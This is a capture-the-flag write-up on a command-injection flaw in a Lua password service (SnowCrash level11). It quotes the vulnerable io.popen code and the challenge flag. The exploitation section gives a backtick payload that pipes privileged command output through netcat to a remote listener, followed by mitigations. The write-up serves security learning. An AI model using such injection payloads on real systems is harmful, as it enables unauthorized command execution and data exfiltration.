# CTF Report: SnowCrash Level11

## Summary
Command injection vulnerability in Lua socket server. The `level11.lua` script uses `io.popen()` without input sanitization, allowing shell command injection through backtick operators.

**Flag:** `fa6v5ateaw21peobuub8ipe6s`

## Analysis

### Service Discovery
```bash
cat level11.lua
```

**Key Findings:**
- Lua script listening on `127.0.0.1:5151`
- Accepts password input from clients
- Uses vulnerable `io.popen()` for password hashing

### Vulnerable Code
```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  return data
end
```

**Vulnerability:** User input (`pass`) is directly concatenated into shell command without sanitization.

## Vulnerability

**Type:** Command Injection (CWE-78)

**Root Cause:** 
- `io.popen()` executes shell commands
- User input concatenated directly: `"echo "..pass.." | sha1sum"`
- No input validation or escaping
- Backticks (`` ` ``) allow command substitution

## Exploitation

### Step 1: Setup Listener
Open a new SSH session and setup netcat listener:
```bash
nc -l 3131
```

### Step 2: Inject Payload
Connect to the Lua service and inject command:
```bash
nc 127.0.0.1 5151
Password: `getflag | nc 10.11.162.105 3131`
Erf nope..
```

**Payload Breakdown:**
- Backticks trigger command substitution
- `getflag` executes with flag11 privileges
- Output piped to netcat connecting to our listener
- Command runs before password check

### Step 3: Receive Flag
On listener session:
```
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Attack Chain

1. Lua server accepts connection on port 5151
2. Our payload: `` `getflag | nc 10.11.162.105 3131` ``
3. Server executes: `echo `getflag | nc 10.11.162.105 3131` | sha1sum`
4. Shell processes backticks first (command substitution)
5. `getflag` runs with elevated privileges
6. Output sent to our remote listener via netcat
7. Flag captured out-of-band

## Mitigation

1. **Never use shell execution with user input**
2. Use proper Lua libraries for hashing instead of `io.popen()`
3. Sanitize all user input - escape shell metacharacters
4. Use parameterized commands or safe APIs
5. Implement input validation with whitelists
6. Run service with minimum required privileges
7. Use `os.execute()` with proper escaping or avoid shell entirely

**Secure Alternative:**
```lua
local crypto = require("crypto")
function hash(pass)
  return crypto.digest("sha1", pass)
end
```

## Timeline
- Discovered Lua service on port 5151
- Analyzed source code - found command injection
- Setup remote listener for out-of-band data exfiltration
- Crafted payload with command substitution
- Successfully captured flag via netcat tunnel